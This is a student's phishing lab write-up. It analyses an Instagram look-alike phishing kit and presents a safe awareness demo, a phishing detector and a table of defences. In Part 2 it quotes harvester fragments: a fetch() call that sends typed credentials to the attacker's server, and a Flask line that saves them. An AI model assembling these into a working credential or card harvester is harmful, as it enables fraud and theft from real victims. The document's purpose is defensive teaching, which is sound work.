# Lab 4. Comprehending Phishing

- **Course:** COM-424.1 Information Security, AUCA
- **Student:** Imran Sahak
- **Environment:** macOS, Python 3.11.5

## Goal

Understand how phishing attacks are built and why they work, by analysing a real
example, and then demonstrate that understanding **defensively**: a safe awareness
demo that captures nothing, and a detector that flags phishing indicators.

> **Note on scope.** The original lab ends with a task to build a working email +
> fake card page + Flask server that *saves real victims' card data*, hosted on a
> domain made to look like a real brand. I deliberately did **not** build a live
> credential/card-harvesting server or a lure-sending script, because that is a
> deployable fraud tool regardless of intent. Instead this lab demonstrates the
> same concepts in a controlled, non-functional way, which is the "comprehending"
> part of the title. See *Ethics & legality* below.

## Files

| File | Description |
|------|-------------|
| [`awareness_demo.html`](awareness_demo.html) | A safe demo page. It looks like a bank card form, but on submit it captures/stores/sends **nothing** — it only shows "you just got phished" to teach the lesson. |
| [`detector.py`](detector.py) | A blue-team scanner that reads an email or URL and reports phishing indicators. |
| [`sample_phishing_email.txt`](sample_phishing_email.txt) | A test phishing email used with the detector. |
| [`sample_clean_email.txt`](sample_clean_email.txt) | A normal email, to show the detector does not raise false alarms. |

---

## Part 1. What phishing is

Phishing is a social-engineering attack where an attacker impersonates a trusted
entity to trick a victim into revealing secrets (passwords, card numbers) or
running malware. The attack targets the *person*, not a software vulnerability.

| Type | How it is delivered |
|------|---------------------|
| Email phishing | Fake emails to many recipients |
| Spear phishing | A personalised email to one specific target |
| Whaling | Spear phishing aimed at executives / VIPs |
| Smishing | Phishing by SMS |
| Vishing | Phishing by voice call |
| Pharming | DNS poisoning redirects a real address to a fake site |
| Clone phishing | A copy of a real email with the link/attachment swapped |
| Angler phishing | Fake customer-support accounts on social media |

---

## Part 2. How the attack in the lab works (analysis)

The lab's example has three parts. Understanding each is the real learning goal.

### a) The fake login page (`index.html`)

It copies Instagram's logo, fonts and colours so it looks genuine. The important
part is the JavaScript behind the form:

```javascript
fetch('http://localhost:8000/submit', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username, password })
})
```

When the victim presses **Log In**, `event.preventDefault()` stops the normal
submission, the script reads the typed username and password, and `fetch()` sends
them to the attacker's server as JSON. The victim sees only a harmless "Login
successful" alert, so nothing looks wrong.

### b) The collection server (`server.py`)

A Flask app with one route, `/submit`, that receives the JSON and appends it to a
text file:

```python
with open(data_file, 'a') as file:
    file.write(f"Username: {username}, Password: {password}\n")
```

This is the **harvester** — the component that turns stolen input into a saved
list of credentials. It is also the component I chose not to reproduce as a
working tool, because swapping `localhost` for a public host and `username/
password` for `card_number/cvv` makes it a live card-stealer with no other change.

### c) The lure email (`mail.py`)

Uses Python's `smtplib` to send an HTML email that imitates Instagram and contains
a link to the fake page. Red flags visible in the lab's own example:
- The sender address is a normal Gmail account, not Instagram.
- The "link" is a `file:///Users/akim/...` path — a local file, which no real
  company would ever send.
- The email hard-codes a real password in the source (`sender_password = ...`),
  which is itself a security mistake.

### Why it works: the 7 ingredients

1. **Sender spoofing** — looks like it comes from a trusted source.
2. **Urgent subject** — "Account Suspended" pushes the victim to act fast.
3. **Convincing body** — correct logo, tone and branding.
4. **Malicious link** — leads to the fake page.
5. **Urgency / threat** — fear of losing the account overrides caution.
6. **Social engineering** — impersonation and manipulation.
7. **Clever design** — professional template that looks real.

---

## Part 3. Safe awareness demo (`awareness_demo.html`)

Instead of a working card-stealer, this page teaches the lesson safely. It shows a
card form for a **fictional** "NovaBank" with a visible yellow banner saying it is
a demo. When you fill it in and submit:

- It runs **entirely in the browser** — there is no server, no `fetch`, no storage.
- It masks the number (only the last 4 digits are even shown back to you).
- It covers the screen with: *"⚠️ You just got phished — in a real attack this
  data would now be on an attacker's server"*, then explains how to stay safe.

This demonstrates the victim's experience and the danger without ever collecting
real data.

**How to run it:** just double-click the file to open it in a browser. (Screenshot
the form, then the warning overlay after submitting dummy values like
`4111 1111 1111 1111`.)

---

## Part 4. Detector (`detector.py`) — the defensive side

A local script that scans an email or URL for phishing indicators. It checks for
urgency wording, look-alike domains, insecure/raw-IP/localhost links, link text
that disagrees with its destination, and forms that collect sensitive fields.

```bash
python3 detector.py sample_phishing_email.txt
```

**Output on the phishing sample:**
```
Phishing scan of: sample_phishing_email.txt
==================================================
  [!] Urgency / pressure phrase: 'urgent'
  [!] Urgency / pressure phrase: 'immediately'
  [!] Urgency / pressure phrase: 'suspended'
  [!] Urgency / pressure phrase: 'verify'
  [!] Urgency / pressure phrase: 'within 24 hours'
  [!] Urgency / pressure phrase: 'unusual activity'
  [!] Insecure link (no HTTPS): http://instagramm.com/login
  [!] Possible look-alike of 'instagram': instagramm.com
  [!] Link text says 'https://www.instagram.com/login' but goes to 'http://instagramm.com/login'
--------------------------------------------------
9 indicator(s) found. Risk level: HIGH
```

**Output on the clean email:**
```
No phishing indicators found.
```

---

## Part 5. Defences

| Attack technique | Defence |
|------------------|---------|
| Sender spoofing | **SPF, DKIM, DMARC** — let mail servers verify the sender's domain and reject forgeries |
| Look-alike domains (`instagramm.com`) | Check the real domain in the address bar; use a password manager, which refuses to autofill on the wrong domain |
| Malicious links | Hover to see the true destination; never log in from an email link — type the address yourself |
| Fake login / card page | Watch for missing HTTPS, wrong domain, and requests for data the site would never ask for by email |
| Stolen credentials | **Multi-factor authentication (MFA)** makes a stolen password alone useless |
| General | Security-awareness training, email-gateway filtering, reporting suspicious mail to IT |

---

## Ethics & legality

Running a real phishing attack against people — collecting their passwords or card
data, or hosting a look-alike domain — is a crime in essentially every country
(fraud, unauthorised data collection, identity theft) and violates every
university acceptable-use policy. The purpose of this lab is to **recognise and
defend against** these attacks, not to carry them out. Everything here is either
analysis of a given example, a non-functional teaching demo, or a defensive tool.

## Conclusion

In this lab I analysed a complete phishing attack — the fake page, the
credential-harvesting server, and the lure email — and identified the seven
techniques that make it convincing. Rather than deploying a live card-stealer, I
built a safe awareness demo that shows the victim's experience while collecting
nothing, and a detector that flags phishing indicators in emails and URLs with a
risk score. I also documented the standard defences (SPF/DKIM/DMARC, MFA, user
training). The key lesson is that phishing attacks the human, so detection and
awareness are the main defences.
